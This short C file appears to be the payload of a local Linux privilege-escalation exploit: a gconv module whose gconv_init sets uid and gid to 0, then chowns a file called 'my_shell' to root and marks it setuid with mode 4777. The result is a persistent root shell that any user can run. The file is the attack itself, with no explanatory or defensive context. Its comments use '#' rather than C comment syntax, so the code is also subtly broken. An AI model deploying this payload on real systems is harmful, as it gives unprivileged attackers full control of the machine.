#include <unistd.h>
#include <stdlib.h>
#include <gconv.h>

int gconv_init() {

    # We set the id and group of the process to root.

    setuid(0);
    setgid(0);
    
    # We make the utility as if it were from root, we also set the bit setuid as root. 
    system("/usr/bin/chown root my_shell");
    system("/usr/bin/chmod 4777 my_shell");
}

void gconv(){}
